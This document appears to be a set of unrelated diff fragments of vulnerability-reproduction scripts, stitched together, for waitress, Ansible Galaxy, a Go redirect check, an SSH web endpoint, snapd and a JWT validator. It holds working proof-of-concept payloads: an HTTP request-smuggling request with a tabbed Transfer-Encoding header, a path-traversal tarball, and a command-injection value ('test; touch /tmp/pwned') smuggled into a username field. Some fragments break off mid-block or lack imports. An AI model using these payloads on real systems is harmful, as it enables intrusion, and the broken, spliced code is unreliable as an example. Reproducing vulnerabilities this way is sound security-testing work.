+import socket
+import time
+
+# Malicious request with a tab character in Transfer-Encoding
+malicious_request = (
+    b"POST / HTTP/1.1\r\n"
+    b"Host: localhost\r\n"
+    b"Content-Length: 5\r\n"
+    b"Transfer-Encoding: chunked\t\r\n"
+    b"\r\n"
+    b"0\r\n"
+    b"\r\n"
+    b"12345"
+)
+
+def run_test():
+    try:
+        # Create a socket and connect to the waitress server
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect(("127.0.0.1", 8080))
+            s.sendall(malicious_request)
+            time.sleep(1)  # Wait for the server to process the request
+            s.setblocking(False)
+            try:
+                response = s.recv(4096)
+                print(f"Received response: {response.decode()}")
+            except BlockingIOError:
+                print("No response received, which is expected if the server is vulnerable.")
+
+    except ConnectionRefusedError:
+        print("Connection refused. Make sure the waitress server is running.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    time.sleep(2)
+    run_test()

+import os
+import tarfile
+
+# Create a dummy collection tarball with a malicious filename
+with tarfile.open('malicious.tar.gz', 'w:gz') as tar:
+    # Create a file with a path traversal attempt
+    with open('../pwned', 'w') as f:

+    tar.add('../pwned')
+
+# Now, try to install the malicious collection

+from ansible.utils.display import Display
+
+# Create a dummy display object
+display = Display()
+
+# Create a dummy collection object
+collection = GalaxyCollection('my_namespace', 'my_collection', '1.0.0', display)
+
+# Set the path to the malicious tarball
+collection.b_path = b'malicious.tar.gz'
+
+# Create a temporary directory for installation
+import tempfile
+b_temp_path = tempfile.mkdtemp()
+
+# Try to install the collection
+try:
+    collection.install(b_temp_path, b_temp_path)
+except Exception as e:
+    print('Caught exception as expected:')

+

new file mode 100644
index 00000000..41543c9f
--- /dev/null
+++ b/reproduce.go
@@ -0,0 +1,86 @@
+
+package main
+
+import (
+"fmt"
+"net/url"
+"regexp"
+"strings"
+)
+
+// vulnerable regex
+var invalidRedirectRegex = regexp.MustCompile(`^/(\s|\v)?(/|\\)`)
+
+// correct regex
+var validRedirectRegex = regexp.MustCompile(`^/(\/|[^/\s].*)?$`)
+
+func main() {
+fmt.Println("---Vulnerable Code---")
+runTests(true)
+fmt.Println("\n---Patched Code---")
+runTests(false)
+}
+
+func runTests(vulnerable bool) {
+// Test cases based on the vulnerability.
+testCases := []struct {
+redirect string
+isValid  bool
+}{
+{"http://google.com", true},
+{"https://google.com", true},
+{"//example.com", false},
+{"/\\example.com", false},
+{"/", true},
+{"/foo", true},
+{"//", false},
+{"/\\", false},
+{"/ /", false},
+{"/\t/", false},
+}
+
+for _, tc := range testCases {
+var isValid bool
+if vulnerable {
+isValid = isValidRedirectVulnerable(tc.redirect)
+} else {
+isValid = isValidRedirectPatched(tc.redirect)
+}
+
+if isValid != tc.isValid {
+fmt.Printf("FAIL: redirect: %q, expected: %v, got: %v\n", tc.redirect, tc.isValid, isValid)
+} else {
+fmt.Printf("PASS: redirect: %q, expected: %v, got: %v\n", tc.redirect, tc.isValid, isValid)
+}
+}
+}
+
+func isValidRedirectVulnerable(redirect string) bool {
+switch {
+case redirect == "":
+return false
+case strings.HasPrefix(redirect, "/") && !strings.HasPrefix(redirect, "//") && !invalidRedirectRegex.MatchString(redirect):
+return true
+case strings.HasPrefix(redirect, "http://") || strings.HasPrefix(redirect, "https://"):
+// In a real scenario, this would check against a whitelist of domains.
+// For this test, we'''ll consider any valid http/https URL as a valid redirect.
+_, err := url.Parse(redirect)
+return err == nil
+default:
+return false
+}
+}
+
+func isValidRedirectPatched(redirect string) bool {
+switch {
+case redirect == "":
+return false
+case validRedirectRegex.MatchString(redirect):
+return true
+case strings.HasPrefix(redirect, "http://") || strings.HasPrefix(redirect, "https://"):
+_, err := url.Parse(redirect)
+return err == nil
+default:
+return false
+}
+}

@@ -0,0 +1,39 @@
+
+package main
+
+import (
+"fmt"
+"net/http"
+"net/url"
+"os"
+
+)
+
+func main() {
+// Simulate the vulnerable request
+username := "test; touch /tmp/pwned"
+hostname := "localhost"
+port := "22"
+
+// Construct the request URL
+u, _ := url.Parse("http://127.0.0.1:8000/ssh/create")
+q := u.Query()
+q.Set("username", username)
+q.Set("hostname", hostname)
+q.Set("port", port)
+u.RawQuery = q.Encode()
+
+// Create and send the request
+req, _ := http.NewRequest("POST", u.String(), nil)
+req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+client := &http.Client{}
+client.Do(req)
+
+// Check if the file was created
+_, err := os.Stat("/tmp/pwned")
+if err == nil {
+fmt.Println("Vulnerability confirmed: /tmp/pwned created")
+} else {
+fmt.Println("Vulnerability not confirmed")
+}
+}

+#!/bin/bash
+
+# GIVEN
+# Create a test user and group that will be used for the test
+if ! getent group testgroup > /dev/null; then
+    groupadd testgroup
+fi
+if ! id "testuser" > /dev/null 2>&1; then
+    useradd -m -g testgroup testuser
+fi
+
+# WHEN
+# Run the vulnerable command as the test user.
+# The command being tested is `snap run`.
+# The `snap` command is not in the PATH, so I need to specify the full path.
+# Also, `runuser` is not available, so I will use `su`.
+# The command will create the '~/snap' directory.
+echo "Running snap run..."
+ls -l /workspace/snapd/cmd/snap/snap
+su -s /bin/bash testuser -c "/workspace/snapd/cmd/snap/snap run"
+
+# THEN
+# Check the permissions of the '~/snap' directory.
+# The `stat` command will provide the permissions of the directory in octal format.
+# I am interested in the permissions of the '~/snap' directory, if it exists.
+if [ -d "/home/testuser/snap" ]; then
+    permissions=$(stat -c "%a" "/home/testuser/snap")
+    echo "Permissions for /home/testuser/snap: $permissions"
+fi

+func TestValidateAccessTokenWithExpiredToken(t *testing.T) {
+// Create a new signer
+signer, err := jose.NewSigner(jose.SigningKey{Algorithm: jose.RS256, Key: testKey}, nil)
+assert.NoError(t, err)
+
+// Create an expired claims
+expiredClaims := jwt.Claims{
+Issuer:   "test_issuer",
+Audience: jwt.Audience{"test_audience"},
+Expiry:   jwt.NewNumericDate(time.Now().Add(-1 * time.Hour)),
+}
+
+// Create a new JWT with expired claims
+builder := jwt.Signed(signer)
+builder = builder.Claims(expiredClaims)
+expiredToken, err := builder.CompactSerialize()
+assert.NoError(t, err)
+
+// Create a new resource server
+resourceServer := ResourceServer{
+signatureVerifier: &testKeySet{
+keys: []jose.JSONWebKey{
+{
+Key:       &testKey.PublicKey,
+Use:       "sig",
+Algorithm: "RS256",
+},
+},
+},
+allowedAudience: []string{"test_audience"},
+}
+
+// Validate the expired token
+_, err = resourceServer.ValidateAccessToken(context.Background(), "test_audience", expiredToken)
+assert.Error(t, err)
+assert.Contains(t, err.Error(), "token is expired")
+}
+
+type testKeySet struct {
+keys []jose.JSONWebKey
+}
+
+func (t *testKeySet) VerifySignature(ctx context.Context, token string) ([]byte, error) {
+jws, err := jose.ParseSigned(token)
+if err != nil {
+return nil, err
+}
+return jws.Verify(&t.keys[0])
+}
+
+var testKey, _ = rsa.GenerateKey(rand.Reader, 2048)

+    # to find a needle in a haystack without knowing the content-type
+    # of the file and without decoding its content and taking up lots of memory
